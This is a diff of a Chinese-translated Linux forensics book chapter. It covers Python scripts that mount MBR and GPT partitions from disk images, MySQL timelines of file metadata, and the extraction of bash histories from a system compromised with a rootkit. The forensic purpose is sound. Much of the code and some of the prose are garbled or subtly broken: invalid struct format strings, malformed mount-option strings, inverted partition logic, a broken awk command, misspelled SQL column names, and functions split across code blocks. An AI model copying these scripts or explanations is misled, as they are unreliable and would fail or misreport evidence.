+    offset + 16])[0]
+```
+
+```python
+def printPart(self):
+
+    if self.empty == True:
+
+        print("<empty>")
+
+    else:
+
+        outstr = ""
+
+        if self.active == True:
+
+            outstr += "Bootable:"
+
+        outstr += "Type " + str(self.type) + ":"
+
+        outstr += "Start " + str(self.start) + ":"
+
+        outstr += "Total sectors " + str(self.sectors)
+
+        print(outstr)
+```
+
+```python
 def usage():
+
     print("usage " + sys.argv[0] + \
-        "<image file>\n尝试从镜像文件中挂载分区") )
+        "<image file>\n尝试从镜像文件中挂载分区")
 ```
 
 ```python
 exit(1)
+
 def main():
+
     if len(sys.argv) < 2:
+
         usage()
+
     # 读取第一个扇区
+
     if not os.path.isfile(sys.argv[1]):
+
         print("File " + sys.argv[1] + " 无法打开读取")
+
         exit(1)
+
     with open(sys.argv[1], 'rb') as f:
+
         sector = str(f.read(512))
+
         if sector[510] == "\x55" and sector[511] == "\xaa":
+
             print("看起来像是一个 MBR 或 VBR")
+
         # 如果是 MBR，字节 446, 462, 478, 和 494 必须是 0x80 或 0x00
+
         if (sector[446] == "\x80" or sector[446] == "\x00") and \
             (sector[462] == "\x80" or sector[462] == "\x00") and \
             (sector[478] == "\x80" or sector[478] == "\x00") and \
             (sector[494] == "\x80" or sector[494] == "\x00"):
+
             print("必须是一个 MBR")
+
             parts = [MbrRecord(sector, 2), MbrRecord(sector, 3)]
+
             for p in parts:
+
                 p.printPart()
+
                 if not p.empty:
+
                     notupParts = [0x05, 0x0f, 0x85, 0x91, 0x9b, 0xc5, 0xe4, 0xee]
+
                     if p.type in notupParts:
+
                         print("抱歉，GPT 和扩展分区此脚本并不支持!")
+
                 else:
+
                     mountpath = '/media/part%s' % str(p.partno)
+
                     # 如果相应的目录不存在，则创建它
+
                     if not os.path.isdir(mountpath):
+
                         subprocess.call(['mkdir', mountpath])
+
                     mountopts = ['loop,ro,noatime,offset=%s' % \
                         str(p.start * 512)]
+
                     subprocess.call(['mount', '-o', \
                         mountopts, sys.argv[1], mountpath])
+
         else:
+
             print("看起来是一个 VBR！正在尝试挂载")
+
             if not os.path.isdir('/media/part1'):
+
                 subprocess.call(['mkdir', '/media/part1'])
+```
+
 ```python
 subprocess.call(['mount', '-o', 'loop,ro,noatime', \
 sys.argv[1], '/media/part1'])
@@ -2592,13 +2871,9 @@ if __name__ == "__main__":
     main()
 ```
 
+目标分区的 MBR 偏移量为 `446 + partno * 16`，因为第一条记录位于偏移量 `446`，每条记录长度为 `16` 字节。
 
-
-
-
-# 目标分区的 MBR 偏移量为 446 + partno * 16，因为第一条记录位于偏移量 446，每条记录长度为 16 字节。
-
-接下来我们检查分区条目中的第一个字节是否为 0x80，这表示分区处于激活状态（可启动）。Python 与许多其他语言一样，可以将字符串视为数组。同样，与大多数语言一样，索引是从零开始的。`==` 运算符用于检查相等性，而 `=` 运算符用于赋值。Python 中的单个十六进制值可以用包含 `\x` 前缀的紧凑字符串表示。例如，`\x8080`。在这些之后，我们看到以下代码设置了一个名为 Active 的类属性值，如果分区条目中的第一个字节是 0x80，则将该值重置为 True。注意 Python 使用缩进来确定在语句评估为 True 时执行的内容。
+接下来我们检查分区条目中的第一个字节是否为 `0x80`，这表示分区处于激活状态（可启动）。Python 与许多其他语言一样，可以将字符串视为数组。同样，与大多数语言一样，索引是从零开始的。`==` 运算符用于检查相等性，而 `=` 运算符用于赋值。Python 中的单个十六进制值可以用包含 `\x` 前缀的紧凑字符串表示。例如，`\x8080`。在这些之后，我们看到以下代码设置了一个名为 `Active` 的类属性值，如果分区条目中的第一个字节是 `0x80`，则将该值重置为 `True`。注意 Python 使用缩进来确定在语句评估为 `True` 时执行的内容。
 
 ```python
 self.active = False
@@ -2607,11 +2882,13 @@ if sector[offset] == '\x80':
     self.active = True
 ```
 
-在解释激活标志后，`MbrRecord` 构造函数获取分区类型并将其作为数值（而非紧凑字符串）存储在这一行：`self.type = ord(sector[offset+4])`。`ord(<single字符>)` 用于将紧凑字符串转换为整数值。接着检查下一个字节是否等于零。如果是，则将 `empty` 的类属性值设置为 True。
+在解释激活标志后，`MbrRecord` 构造函数获取分区类型并将其作为数值（而非紧凑字符串）存储在这一行：`self.type = ord(sector[offset+4])`。`ord(<single字符>)` 用于将紧凑字符串转换为整数值。接着检查下一个字节是否等于零。如果是，则将 `empty` 的类属性值设置为 `True`。
 
 最后，从 MBR 中提取起始值和总长度值，并将它们存储在相应的类属性中。这两行代码中发生了很多操作。如果将其拆解，会更容易理解。我们从语句 `sector[offset+8]` 开始：在 Python 术语中，这被称为数组切片（slice）。数组无非是一个值的列表，用从零开始的整数进行索引。因此 `myArray[0]` 是 `myArray` 中的第一个项，`myArray[1]` 是第二个，以此此类推。在 Python 中指定子数组（切片）的语法是 `myArray[<切片的起始索引:结束索引>]`。例如，如果 `myArray` 包含 "This is the end, my one true friend!"，那么 `myArray[8:15]` 将等于 "end"。
 
 构造函数最后两行中的切片是紧凑字符串格式的 32 位小端序整数。如果你熟悉“小端序”（little endian）这个术语，它指的是计算机存储多字节值的方式。几乎所有计算机在进行取证存储时都可能以小端序格式存储值，这意味着字节从低位到高位存储。例如，值 `0xAABBCCD` 在紧凑字符串格式下表示为 `\xCD\xCC\xBB\xAA`（此处为示例）。来自 `struct` 库的 `unpack` 函数用于将紧凑字符串转换为数值。
+
+
 
 记得 `struct` 库是我们在文件顶部导入的库之一。为了让 Python 找到这些已导入库中的函数，你必须在函数名前前加上一个点。这就是为什么在我们的脚本中，`unpack` 函数被调用为 `struct.unpack`。`unpack` 函数接受一个格式字符串和一个紧凑字符串作为输入。我们的格式字符串 `'<I'` 指定了一个小端序格式的无符号整数。输入到 `unpack` 函数的格式字符串可以包含多个字符，允许 `unpack` 一次转换多个值。因此，`unpack` 函数返回一个数组。这就是为什么你在最后两行末尾看到索引，因为我们只需要返回数组中的第一个项（它本应该是唯一的！）。当你将其拆解，很容易看出 `self.start = struct.unpack('<I', sector[offset + 8: offset + 12])[0]` 获取了一个包含小端序格式字符串 `sector` 的 4 字节紧凑字符串，使用 `unpack` 将其转换为数值，然后将结果存储在名为 `start` 的类属性中。
 
@@ -2635,7 +2912,6 @@ if not os.path.isfile(sys.argv[1]):
 with open(sys.argv[1], 'rb') as f:
     sector = str(f.read(512))
 ```
-
 
 一旦我们得到了分区，就会通过下面的 `for` 循环遍历列表：
 
@@ -2695,51 +2971,87 @@ import os.path
 import subprocess
 import struct
 """
+```
 
-Class MbrRecord：从主引导记录 (MBR) 中解码分区记录
+Class `MbrRecord`：从主引导记录 (MBR) 中解码分区记录
 
 ```python
 """
-用法: rec = MbrRecord(sector, partno) 其中 sector 是包含 MBR 的 512 字节或更大的扇区
-partno 是感兴趣的分区号 0-3
-rec.printPart() 打印分区信息
+```
+
+用法: `rec = MbrRecord(sector, partno)` 其中 `sector` 是包含 MBR 的 512 字节或更大的扇区
+
+`partno` 是感兴趣的分区号 0-3
+
+`rec.printPart()` 打印分区信息
+
+```python
 """
 class MbrRecord:
+
     def __init__(self, sector, partno):
+
         self.partno = partno
+
         # 第一条记录位于偏移量 446，且记录每条 16 字节
+
         offset = 446 + partno * 16
+
         self.active = False
+
         # 第一字节 == 0x80 表示活动（可启动的）
+
         if sector[offset] == '\x80':
+
             self.active = True
+
         self.type = ord(sector[offset+4])
+
         self.empty = False
+
         # 分区类型 == 0 表示它是空闲
+
         if self.type == 0:
+
             self.empty = True
+
         # 扇区值为 32 位的，并以小端格式存储
+
         self.start = struct.unpack('<I', sector[offset + 8 :offset + 12])[0]
+
         self.sectors = struct.unpack('<I', sector[offset + 12 :offset + 16])[0]
 
     def printPart(self):
-        if self.empty == True:
-            print("<empty>")
-        else:
-            outstr = ""
-            if self.active:
-                outstr += "Bootable:"
-            outstr += " Type " + str(self.type) + ":"
-            outstr += "Start " + str(self.start) + ":"
-            outstr += "Total sectors " + str(self.sectors)
-            print(outstr)
 
+        if self.empty == True:
+
+            print("<empty>")
+
+        else:
+
+            outstr = ""
+```
+
+
+
+```python
+if self.active:
+    outstr += "Bootable:"
+outstr += " Type " + str(self.type) + ":"
+outstr += "Start " + str(self.start) + ":"
+outstr += "Total sectors " + str(self.sectors)
+print(outstr)
+```
+
+```python
 def usage():
     print("usage " + sys.argv[0] + " <image file>\nAttempts to mount partitions from image file")
     exit(1)
 
 def main():
-``````python
+```
+
+```python
 if len(sys.argv) < 2:
     usage()
 # 扩展分区将被处理
@@ -2792,8 +3104,6 @@ if __name__ == "__main__":
     main()
 ```
 
-
-
 接下来，我们将 mini-MBR 中的前几个条目读取到列表 `extParts` 中。如果 `extParts[0]` 是交换分区，我们则跳过它。否则，我们尝试挂载它。编码方法与上一个脚本中的相同。
 
 然后，我们检查 mini-MBR 中的第二个条目（`extParts[1]`）。如果其类型为 `00x`，则表示没有扩展分区，我们的工作完成。如果是这种情况，则将嵌套分区的起始扇区赋值给 `extendPartStart` 并递增 `incrementPartNo`，以便为下一次循环迭代做好正确设置。
@@ -2801,6 +3111,10 @@ if __name__ == "__main__":
 ### GPT 分区
 
 现在我们已经涵盖了基于 MBR 方法的分区系统，让我们转向基于 GUID 的分区系统吧。希望在接下来的几年内，这将成为你在调查期间需要处理的唯一系统。正如我之前所说，这个新系统要直接且优雅得多。以下是我们自动挂载这些分区的脚本。
+
+
+
+# mount-image-gpt.py
 
 ```python
 #!/usr/bin/python
@@ -2848,126 +3162,223 @@ def printGuid(packedString):
 ### partno 是感兴趣的分区号 (0-127)
 ### rec.printPart() 打印分区信息
 
-```python
 class GptRecord:
+
     def __init__(self, recs, partno):
+
         self.partno = partno
+
         offset = partno * 128
+
         self.empty = False
+
         # 构建分区类型字符串
+
         self.partType = printGuid(recs[offset:offset+16])
+
         if self.partType == "00000000-0000-0000-000000000000":
+
             self.empty = True
+
         self.partGuid = printGuid(recs[offset+16:offset+32])
+
         self.firstLBA = struct.unpack('<Q',
+
             recs[offset+32:offset+40])[0]
+
         self.lastLBA = struct.unpack('<Q',
+
             recs[offset+40:offset+48])[0]
+
         self.attr = struct.unpack('<Q',
+
             recs[offset+48:offset+56]) [0]
+
         nameIndex = recs[offset+56:offset+128].find('\x00\x00')
+
         if nameIndex != -1:
+
             self.partName = \
             recs[offset+56:offset+nameIndex].encode('utf-8')
+
         else:
+
             self.partName = \
             recs[offset+56:offset+128].encode('utf-8')
 
     def printPart(self):
+
         if not self.empty:
+
             outstr = str(self.partno) + ":" + self.partType +
                 ":" + self.partGuid + ":" + str(self.firstLBA) +
                 ":" + str(self.lastLBA) + ":" +
                 str(self.attr) + ":" + self.partName
+
         print(outstr)
-"""
-MbrRecord 类：从主引导记录 (MBR) 解码分区记录
-用法: rec = MbrRecord(sector, partno)
-sector 是包含 MBR 的 512 字节扇区
-partno 是感兴趣的分区号 (0-3)
-rec.printPart() 打印分区信息
-"""
+```
+
+
+
+# MbrRecord 类：从主引导记录 (MBR) 解码分区记录
+
+用法: `rec = MbrRecord(sector, partno)`
+
+`sector` 是包含 MBR 的 512 字节扇区
+
+`partno` 是感兴趣的分区号 `0-3`
+
+`rec.printPart()` 打印分区信息
+
+```python
 class MbrRecord():
+
     def __init__(self, sector, partno):
+
         self.partno = partno
+
         # 偏移 446 处的第一个记录为 16 字节
+
         offset = 446 + partno * 16
+
         self.active = False
+
         # 首字节为 0x80 (启动)
+
         if sector[offset] == '\x80':
+
             self.active = True
+
         self.type = ord(sector[offset+4])
+
         self.empty = False
+
         # 分区类型 == 0 表示为空
+
         if self.type == 0:
+
             self.empty = True
+
         # 值为 32 位并以小端格式存储
+
         self.start = struct.unpack('<I', sector[offset + 8:
             offset + 12])[0]
+
         self.sectors = struct.unpack('<I', sector[offset + 12:
             offset + 16])[0]
 
     def printPart(self):
-        if self.empty:
-            print("<empty>")
-        else:
-            outstr = ""
-            if self.active == "Bootable":
-                outstr += "Type " + str(self.type) + ":"
-            outstr += "Start " + str(self.start) + ":"
-            outstr += "Total sectors " + str(self.sectors)
-        print(outstr)
 
+        if self.empty:
+
+            print("<empty>")
+
+        else:
+
+            outstr = ""
+
+            if self.active == "Bootable":
+
+                outstr += "Type " + str(self.type) + ":"
+
+            outstr += "Start " + str(self.start) + ":"
+
+            outstr += "Total sectors " + str(self.sectors)
+
+        print(outstr)
+```
+
+```python
 def usage():
+
     print("usage " + sys.argv[0] + " <image file>\n尝试从镜像文件中挂载分区")
+
     exit(1)
 
 def main():
+
     if len(sys.argv) < 2:
+
         usage()
+
     # 读取第一个扇区
+
     if not os.path.isfile(sys.argv[1]):
+
         print("File " + sys.argv[1] + " 无法读取")
+
         exit(1)
+
     with open(sys.argv[1], 'rb') as f:
+
         sector = f.read(512)
+
         if (sector[510] == "\x55" and sector[511] == "\xaa"):
+
             # 保护性 MBR 状态检查
+
             part = MbrRecord(sector, 0)
+
             if part.type != 0xee:
+
                 print("保护性 MBR 检查失败")
+
                 exit(1)
+
         # 检查头作为检查
+
         with open(sys.argv[1], 'rb') as f:
+
             f.seek(512)
+
             sector = str(f.read(512))
+
             if sector[0:8] != "EFI PART":
+
                 print("您似乎缺少 GUI 头")
+
                 exit(1)
 
         print("找到保护性 MBR 和 GPT 分区表")
+
         with open(sys.argv[1], 'rb') as f:
+
             f.seek(1024)
+
             partRecs = str(f.read(512 * 32))
+
         parts = []
+
         for i in range(0, 128):
+
             p = GptRecord(partRecs, i)
+
             if not p.empty:
+
                 p.printPart()
+
                 parts.append(p)
+
         for p in parts:
+
             if p.partType in supportedParts:
+
                 print("分区 %s 似乎支持，正在尝试挂载" + str(p.partno))
+
                 mountpath = '/media/part%s' % str(p.partno)
+
                 if not os.path.isdir(mountpath):
+
                     subprocess.call(['mkdir', mountpath])
+
                 mountopts = 'loop,noatime, offset=%s' + str(p.firstLBA * 512)
+
                 subprocess.call(['mount', '-o', mountopts, sys.argv[1], mountpath])
 
 if __name__ == "__main__":
+
     main()
 ```
-
 
 ```python
 format(struct.unpack('>x00', 
@@ -2977,18 +3388,18 @@ format(struct.unpack('>x00',
 ```python
 else:
     outstr = "<invalid"
-
 return outstr
 ```
 
 此辅助函数使用了与之前脚本中相同的 `struct.pack` 方法。不同之处在于，GUID 的前三部分是以小端序（little endian）格式存储的，最后两个部分是大端序（big endian）格式。这就是为什么前三次调用 `struct.pack` 时其格式字符串中包含 `<`，而后两次包含 `>`。此外，最后的解包（unpack）看起来可能有点奇怪。我所做的只是在值前面添加前导零字节，因为没有针对 6 字节值的解包说明符，但有针对 8 字节值的说明符。
 
-我们在该辅助函数中引入了一个新函数 `format`。顾名其名，`format` 用于以特定的方式打印值。我们选择的格式 `'X'` 表示大写十六进制。一旦我们得到了一个包含该值的字符串，就会对该字符串运行 `zfill()` 来添加前导零，以便我们的 GUID 能够正确打印。示例中，表达式 `format(struct.unpack('<L', '\x04\x00\x00\x00') [0], 'X').zfill(8)` 的结果为字符串 `'00000004'`。
+我们在该辅助函数中引入了一个新函数 `format`。顾名其意，`format` 用于以特定的方式打印值。我们选择的格式 `'X'` 表示大写十六进制。一旦我们得到了一个包含该值的字符串，就会对该字符串运行 `zfill()` 来添加前导零，以便我们的 GUID 能够正确打印。示例中，表达式 `format(struct.unpack('<L', '\x04\x00\x00\x00') [0], 'X').zfill(8)` 的结果为字符串 `'00000004'`。
 
 我们定义了一个 `Gptrd` 类，它的行为与之前脚本中的 `MbrClass` 相同。它期望一个分区表项列表（128 个）和一个指向该表的索引。该类中只有以下几行需要解释：
 
 ```python
 nameIndex = recs[offset+56:offset+128].find('\x00\x00')
+
 if nameIndex != -1:
     self.partName = \
     recs[offset+56:offset+56+nameIndex].encode('utf-8')
@@ -2996,6 +3407,8 @@ else:
     self.partName = \
     recs[offset+56:offset+128].encode('utf-8')
 ```
+
+
 
 为什么这些行在这里在这里？我发现，有时 GPT 中用于存储分区名的 Unicode 字符串是空终止的（带有 `0x00 0x00`），在终止空字符之后可能会有随机的垃圾数据。此代码片段的第一行用于查找名称中是否存在空字符。如果找到了字符串，`nameIndex` 将被设置为它的位置。如果未找到字符串，`find` 函数将返回 `-1`。查看 `if` 块你会发现，如果发现了空字符，我们只使用其之前的字符来存储分区名。否则，我们存储整个名称。
 
@@ -3055,13 +3468,10 @@ fi
 ```
 
 ### 分号分隔的文件更容易导入
-# printf 输出访问日期、访问时间、修改日期、修改时间、
-# 创建日期、创建时间、权限、用户 ID、
-# 用户 ID、文件大小、文件名和换行
-
-olddir=$(pwd)
+`printf` 输出访问日期、访问时间、修改日期、修改时间、创建日期、创建时间、权限、用户 ID、用户 ID、文件大小、文件名和换行
 
 ```bash
+olddir=$(pwd)
 cd "$1" # 这避免了在文件名前面加上挂载点
 printf "Access Date;Access Time;Modify Date;Modify Time;Create Date:\nCreate Time;Permissions;User ID;Group ID;File Size;Filename\n"
 find . -printf "%Ax;%AT;%TT;%Cx;%Ct;%U;%G;%p\n"
@@ -3070,7 +3480,7 @@ cd "$olddir"
 
 该脚本非常直接，不包含之前讨论过的新技术。你可能好奇的是使用 `olddir=$(pwd)` 保存当前目录，切换到指定目录，最后通过 `cd $olddir` 返回。这样做是为了防止完整路径（包括挂载点）添加到输出的每个文件名之前。
 
-针对目标系统运行此脚本的部分结果如图 6.1 所示。通常你需要将结果保存到文件中：getmacs (目标文件系统的挂载点) > [输出文件]。例如，`getmacs /media/part0 > pfel.csv`。
+针对目标系统运行此脚本的部分结果如图 6.1 所示。通常你需要将结果保存到文件中：`getmacs` (目标文件系统的挂载点) > [输出文件]。例如，`getmacs /media/part0 > pfel.csv`。
 
 ![](img/7abfab28a493757db3f096946a95ec01_152_0.png)
 
@@ -3078,15 +3488,11 @@ cd "$olddir"
 
 ## 将信息导入 LibreOffice
 
-之前脚本的输出可以很容易地导入 LibreOffice Calc或其他电子表格。只需打开分号分隔的文件即可。你需要指定用于分隔值的符号（我们使用分号），并应该如图 6.2 所示选择日期列使用的格式。
+之前脚本的输出可以很容易地导入 LibreOffice Calc 或其他电子表格。只需打开分号分隔的文件即可。你需要指定用于分隔值的符号（我们使用分号），并应该如图 6.2 所示选择日期列使用的格式。
 
 ![](img/7abfab28a493757db3f096946a95ec01_153_0.png)
 
 图 6.2 将分号分隔的文件导入 LibreOffice。注意日期列应格式化为日期，如所示。
-
-
-
-
 
 ![](img/7abfab28a493757db3f096946a95ec01_154_0.png)
 
@@ -3116,16 +3522,31 @@ cd "$olddir"
 create table files (
 AccessDate date not null,
 AccessTime time not null,
+```
+
+
+
+```
 ModifyDate date not null,
+
 ModifyTime time not null,
+
 CreateDate date not null,
+
 CreateTime time not null,
+
 Permissions smallint not null,
+
 UserId smallint not null,
+
 GroupId smallint not null,
+
 FileSize bigint not null,
+
 Filename varchar(2048) not null,
+
 recno bigint not null auto_increment,
+
 primary key(recno)
 )
 ```
@@ -3143,17 +3564,28 @@ primary key(recno)
 
 ```sql
 load data infile '/tmp/case-pfel.csv'
+
 into table files
+
 fields terminated by ';'
+
 enclosed by '"'
+
 lines terminated by '\n'
+
 ignore 1 rows
+
 (@AccessDate, AccessTime, @ModifyDate, ModifyTime, @CreateDate, \
 CreateTime, Permissions (UserID, GroupID, FileSize, Filename)
+
 set AccessDate=str_to_date(AccessDate, "%m/%d/%Y"),
+
 ModifyDate=str_to_date(@ModifyDate, "%m/%d/%Y"),
+
 CreateDate=str_to_date(@CreateDate, "%m/%d/%Y");
 ```
+
+
 
 `load data infile '/tmp/case-pfel.csv'`
 `into table files`
@@ -3166,11 +3598,6 @@ CreateDate=str_to_date(@CreateDate, "%m/%d/%Y");
 `set AccessDate=str_to_date(AccessDate, "%m/%d/%Y"),`
 `ModifyDate=str_to_date(@ModifyDate, "%m/%d/%Y"),`
 `CreateDate=str_to_date(@CreateDate, "%m/%d/%Y");`
-
-（注：此处原文后续似乎出现了大量重复的乱码字符，已根据指令“不要重复输出原文”的原则进行过滤，保留核心逻辑翻译）
-
-
-
 
 这段代码比我们元数据文件的导入过程要简单一点。主要原因是没有日期或其他复杂的对象需要转换。你会注意到，我使用了用户名而不是用户 ID 作为用户表的主键。之所以这样做，是因为如果攻击者添加了一个具有具有重复 ID 的账户，导入将会失败，因为主键必须是唯一的。攻击者创建一个相同 ID 的新账户并不罕见，特别是对于 root 用户的 ID 0 而言更是如此。通过执行上述脚本来加载这两个表的结果如图 6.10 所示。
 
@@ -3220,9 +3647,6 @@ CreateDate=str_to_date(@CreateDate, "%m/%d/%Y");
 
 注意图 6.13 显示了一个正在编辑的文本文件。在这里我们使用了 MySQL 客户端的一个有用功能：`tee <logfile>` 命令。该命令与 shell 命令类似。
 
-
-
-
 ### 创建时间线
 
 正如我们之前提到的，要使用简单的电子表格创建一个将访问、修改和创建时间交织在一起的时间线并不容易。然而，通过我们的数据库，这可以很容易地实现。下面的 Shell 脚本（主要是一个 SQL 脚本）将在数据库中创建一个新的时间线表。该时间线表将允许我们快速地进行时间线分析。
@@ -3235,35 +3659,57 @@ CreateDate=str_to_date(@CreateDate, "%m/%d/%Y");
 ### 在数据库中创建时间线的简单 shell 脚本。
 
 # 为 PentesterAcademy 开发，
+
 ### Dr. Phil Polstra (@ppolstra)
+
 usage () {
+
   echo "usage: <database>"
+
   echo "在数据库中创建时间线的简单脚本"
+
   exit 1
+
 }
 
 if [ $# -lt 1 ]; then
+
   usage
+
 fi
 
 cat << EOF | mysql $1 -u root -p
+
 create table timeline (
+
   Operation char(1),
+
   Date date not null,
+
   Time time not null,
+
   recno bigint not null
+
 );
 
 insert into timeline (Operation, Date, Time, recno)
+
 select "A", accesdate, accxtime, recno from files;
+
 insert into timeline (Operation, Date, Time, recno)
+
 select "M", modifydate, modifytime, recno from files;
+
 insert into timeline (Operation, Date, Time, recno)
+
 select "C", created, createtime, recno from files;
+
 EOF
 ```
 
-此脚本中有一个技术需要解释，因为它在书中之前还没有出现过。相关的行是 `cat << EOF | mysql $1 -u root -p`。这种结构会将从下一行开始直到遇到后面的字符串（在我们的案例中是 'EOF'）为止的所有内容输出（cat）。所有行都会通过管道传递给 mysql，它针对传入的数据库 ($1) 运行，用户为 root 且必须提供密码。
+
+
+此脚本中有一个技术需要解释，因为它在书中之前还没有出现过。相关的行是 `cat << EOF | mysql $1 -u root -p`。这种结构会将从下一行开始直到遇到后面的字符串（在我们的案例中是 `EOF`）为止的所有内容输出（`cat`）。所有行都会通过管道传递给 `mysql`，它针对传入的数据库（`$1`）运行，用户为 `root` 且必须提供密码。
 
 查看此脚本中的 SQL，我们可以看到创建了一个包含字符操作代码、日期、时间和记录号的表。在创建表后，会执行三个 `insert` 语句，将访问、修改和创建时间戳插入表中。注意，`timeline` 中的 `recno` 是 `files` 表的主键。注意由于我们有一个包含所有三个时间戳的表，就可以快速方便地创建时间线。该脚本在我的笔记本电脑上运行不到两秒。
 
@@ -3277,34 +3723,49 @@ EOF
 ### 输出时间线的简单 shell 脚本。
 
 ### 为 PentesterAcademy <starting date>
+
 ### Dr. Phil Polstra (@ppolstra)
+
 usage () {
+
   echo "usage: $0 <database>"
+
   echo "从数据库获取时间线的简单脚本"
+
   exit 1
+
 }
 
 if [ $# -lt 2 ]; then
+
   usage
+
 fi
 
 cat << EOF | mysql $1 -u root -p
+
 select Operation, timeline.date, timeline.time,
+
 filename, permissions, userid, groupid
+
 from files, timeline
+
 where timeline.date >= str_to_date("$2", "%m/%d/%Y") and
+
 files.recno = timeline.recno
+
 order by timeline.date desc, timeline.time desc
+
 EOF
 ```
 
 此时我可能应该提醒你，我们时间线中的时间戳可能被更复杂的攻击者更改过。我们将在书后的部分学习如何检测这些更改。即使是知道修改这些时间戳的攻击者，也可能漏掉几个文件，而这些文件将让你洞察到发生了什么。
 
-上面的脚本是以 2015 年 3 月 1 日作为起始日期运行的。回顾我们的现场分析，像 `netstat` 和 `lsof` 等命令执行失败，这导致我们认为系统可能被 rootkit 感染。图 6.16 中的高亮部分显示X Xing Yi Quan rootkit 于 2015-03-05 23:00:08 被下载到 john 用户的 Downloads 文件夹中。如图 6.17 的高亮部分所示，下载的压缩包在同一天的 23:01:10 被解压。
+上面的脚本是以 2015 年 3 月 1 日作为起始日期运行的。回顾我们的现场分析，像 `netstat` 和 `lsof` 等命令执行失败，这导致我们认为系统可能被 rootkit 感染。图 6.16 中的高亮部分显示 Xing Yi Quan rootkit 于 2015-03-05 23:00:08 被下载到 `john` 用户的 Downloads 文件夹中。如图 6.17 的高亮部分所示，下载的压缩包在同一天的 23:01:10 被解压。
 
 ![](img/7abfab28a493757db3f096946a95ec01_169_0.png)
 
-图 6.16
+### 图 6.16
 显示下载 rootkit 的证据。
 
 ![](img/7abfab28a493757db3f096946a95ec01_169_1.png)
@@ -3321,18 +3782,19 @@ rootkit 压缩包被解压的证据。
 
 我们利用几个元数据数据库表所能做的事情仅仅是冰毛一角。你可以心所欲地进行查询。我们现在将转向你在挂载镜像时可能想要检查的其他常见事项。
 
-### 检查 BASH 历史
+## 检查 BASH 历史
 
 在我们的现场响应期间，我们使用脚本来提取用户的 bash 命令历史。在这里我们将做类似的操作，只是我们使用了文件系统镜像。我们还可以选择性将结果直接导入数据库。执行所有操作的脚本如下。
 
 ```bash
 #!/bin/bash
+
 #
 get-histories.sh
-
 # 获取所有用户 bash 历史文件的简单脚本
+
 ### 由 Dr. Phil Polstra (@ppolstra) 开发
-### 用于 PentesterAcademy.com。
+### 用于 PentesterAcademy.com.
 
 usage () {
   echo "usage: $0 mount point of root> [database name]"
@@ -3347,10 +3809,13 @@ fi
 
 olddir=$(pwd)
 cd $1
+
 ### 仅查找文件
 find home -type f -name ".bash*" -exec awk '{ print "\";0 }' \; /tmp/histories.csv
+
 # 对 root 用户重复操作
 find root -type f -name ".bash*" -exec awk '{ print "\";0 }' \; >> /tmp/histories.csv
+
 cd "$olddir"
 
 if [ $# -gt 1 ]; then
@@ -3362,6 +3827,7 @@ create table if not exists histories (
   recno bigint not null auto_increment,
   primary key(recno)
 );
+
 load data infile "/tmp/histories.csv"
 into table histories
 fields terminated by ';'
@@ -3371,22 +3837,20 @@ EOF
 fi
 ```
 
-在第 3 章中，我们的现场响应脚本只是显示了横幅、历史文件内容和页。如果我们希望将结果导入电子表格和/或数据库，这种格式是不可行的。为了获得便于导入的输出，我们使用 awk。
 
-读者可能不熟悉 awk。它是由 Alfred Aho、Peter Weinberger 和 Brian Kernighan 在 20 世纪 70 年代于贝尔实验室创建的。名字来自作者姓氏的首字母。awk 是一种文本处理语言。awk 最常用的用法是打印文本行中的位置字段。
 
-简单的 awk 用法最好通过示例来学习。例如，命令 `echo "one two three" | awk '{ print $1 $3 }'` 将输出 "one three"。
+在第 3 章中，我们的现场响应脚本只是显示了横幅、历史文件内容和页。如果我们希望将结果导入电子表格和/或数据库，这种格式是不可行的。为了获得便于导入的输出，我们使用 `awk`。
+
+读者可能不熟悉 `awk`。它是由 Alfred Aho、Peter Weinberger 和 Brian Kernighan 在 20 世纪 70 年代于贝尔实验室创建的。名字来自作者姓氏的首字母。`awk` 是一种文本处理语言。`awk` 最常用的用法是打印文本行中的位置字段。
+
+简单的 `awk` 用法最好通过示例来学习。例如，命令 `echo "one two three" | awk '{ print $1 $3 }'` 将输出 "one three"。
 
 ![](img/7abfab28a493757db3f096946a95ec01_172_0.png)
 
 图 6.19
 在 PFE 主题系统上运行此脚本的部分结果如图 6.19 所示。
 
-
-
-
-
-# 从镜像文件中提取 bash 命令历史。
+## 从镜像文件中提取 bash 命令历史
 
 一旦历史记录加载到数据库，就可以使用 `select * from histories order by recno` 轻松地显示。这将提供所有用户的历史记录。请注意，每个账户的历史记录将按照该用户的顺序呈现，但无法判断这些命令是何时执行的。显示单个用户 bash 历史的正确查询语句：`select historyCommand from histories historyFilename like '%%username%' order by recno;`
 
@@ -3398,7 +3862,7 @@ fi
 
 攻击者创建的虚拟账户的 bash 命令历史。请注意正在运行的命令也十分可疑。
 
-图 6.21 显示了 john 账户 bash 历史中的几个有趣的命令。可以看出，该用户创建了 johnnh 账户，将 /bin/true 复制到 /bin/false，为 whoopsie 和 lightdm 创建了密码，将 /bin/bash 复制到 /bin/false，编辑了 group 组文件，将 john 用户的家目录从 /home/john 移动到 /home/john（这导致目录被隐藏），编辑了密码文件，显示了 sed 的帮助页，使用 sed 修改了密码文件，并安装了 rootkit。将 /bin/bash 复制到 /bin/false 可能是为了允许系统账户登录。这可能也是不断弹出“检测到系统问题”消息的来源之一。
+图 6.21 显示了 john 账户 bash 历史中的几个有趣的命令。可以看出，该用户创建了 johnnh 账户，将 `/bin/true` 复制到 `/bin/false`，为 whoopsie 和 lightdm 创建了密码，将 `/bin/bash` 复制到 `/bin/false`，编辑了 group 组文件，将 john 用户的家目录从 `/home/john` 移动到 `/home/john`（这导致目录被隐藏），编辑了密码文件，显示了 sed 的帮助页，使用 sed 修改了密码文件，并安装了 rootkit。将 `/bin/bash` 复制到 `/bin/false` 可能是为了允许系统账户登录。这可能也是不断弹出“检测到系统问题”消息的来源之一。
 
 ```python
 import os
@@ -3406,13 +3870,11 @@ import sys
 import glob
 import gzip
 import datetime
-
 def get_logs(directory='/var/log'):
     logs = []
     if not os.path.exists(directory):
         print(f"Directory {directory} does not exist.")
         return logs
-    
     for log_file in glob.glob(os.path.join(directory, '**')):
         try:
             stat = os.stat(log_file)
@@ -3424,9 +3886,7 @@ def get_logs(directory='/var/log'):
             })
         except Exception as e:
             continue
-    
     return sorted(logs, key=lambda x: x['modified'], reverse=True)
-
 if __name__ == "__main__":
     all_logs = get_logs()
     for log in all_logs:
@@ -3437,38 +3897,32 @@ if __name__ == "__main__":
 
 攻击者使用 john 账户进行多次操作的证据。
 
-# 检查系统日志
+## 检查系统日志
 
